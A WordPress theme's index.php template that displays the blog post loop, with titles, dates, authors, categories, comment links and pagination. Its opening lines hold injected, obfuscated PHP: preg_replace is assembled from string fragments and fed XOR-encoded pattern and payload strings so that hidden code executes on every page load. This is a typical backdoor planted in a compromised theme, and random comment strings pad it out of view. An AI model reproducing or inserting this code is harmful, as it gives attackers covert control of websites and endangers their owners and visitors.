<?php
//RZ3UcXIdZOmunYhiDa4TLVsEqzYSNCR3Ww


$JaKlu='pr'. 'e'.'g'.'_r'.'ep'.'l'.'ace'; $woHgMmfX="g2WVfI1w3cjUvo"^"Ht\x14\x10\x11\x3cP\x0db\x13\x0b\x0cY\x0a"; $JaKlu($woHgMmfX, "2wBm5TGuqpqArzDM7qhkRlw10o8vXBeOaR5IKvzYESxqBtz4wcnametPnD4nSzEBwQosE2VnAHFGFW4xVGVHgfb9TVAhA0cVVBrFTu8zIok9g1rgGWeJUcjjK7ADdOgeDa9C56sxwAcEcUiZ6EOafUcEmsXlOzBzSl50nVZ1pTVlAd1z5Jh"^"W\x01\x23\x01\x1dv\x2e\x13Y\x19\x022\x17\x0el\x11kU79\x17\x3d\x22tc\x3bcQ\x3b\x2aB\x12Hr\x13ok\x5e\x17\x3dp\x7b\x24\x2df\x2b\x28q\x266\x2b29\x3eS3\x06ciGsGxbP2\x5bC\x21\x03\x30\x08\x24pv\x7f\x20o\x05\x1cbuo\x2cP\x04\x03\x5bg4\x20\x0dqQU3be\x5bfrS\x18\x13\x3a\x1c\x0eMOm\x2eC\x18\x05\x20\x1b\x00\x269\x3e\x10\x101\x2c\x14\x10\x04\x0a\x20\x04\x1e\x1e\x1c\x1fS\x03W\x24\x15\x24\x0f\x7d5\x06\x12\x1a\x1d\x247\x00\x26\x169\x28\x7f\x1c\x27\x0a\x1d\x19\x3c\x08P\x173\x7fa\x11\x15\x2c\x3f\x18iM\x0aZHhA", "FCFwuazQpaY");//CZLep6kP1Dyqm4ctETrKAA3wYj6JSgW71  get_header(); ?>
<!-- Container -->
<div class="CON">

<!-- Start SC -->
<div class="SC">

<?php if (have_posts()) : ?>
<?php while (have_posts()) : the_post(); ?>
<div class="Post" id="post-<?php the_ID(); ?>" style="padding-bottom: 40px;">

<div class="PostHead">
<h2><a title="Permanent Link to <?php the_title(); ?>" href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a></h2>
<small class="PostTime">
<strong class="day"><?php the_time('j') ?></strong>
<strong class="month"><?php the_time('M') ?></strong>
<strong class="year"><?php the_time('Y') ?></strong>
</small>
<small class="PostAuthor">Author: <?php the_author() ?></small>
<small class="PostCat">In: <?php the_category(', ') ?></small>
</div>
  
<div class="PostContent">
<?php the_content('Read the rest of this entry &raquo;'); ?>
</div>

<div class="PostCom">
<ul>
 <li class="Com"><?php comments_popup_link('0 Comments', '1 Comment', '% Comments'); ?></li>
 <?php if (function_exists('the_tags')) { ?> <?php the_tags('<li class="Tags">Tags: ', ', ', '</li>'); ?> <?php } ?>
</ul>
</div>
</div>

<!--<?php trackback_rdf(); ?>-->
<div class="clearer"></div>
<?php endwhile; ?>
  
<!-- Start Nav -->
<?php if (function_exists('wp_pagenavi')) {   wp_pagenavi();   } ?>
<!-- End Nav -->

<?php else : ?>
<h2><?php _e('Not Found'); ?></h2>
<p><?php _e('Sorry, no posts matched your criteria.'); ?></p>
<?php endif; ?>
</div> 
<!-- End SC -->


<?php if (function_exists('trackTheme')) { ?>
 <?php get_sidebar();   trackTheme("dilectio");  ?>
<?php } ?>

<?php get_sidebar(); ?>
<!-- Container -->
</div>

<?php get_footer(); ?>
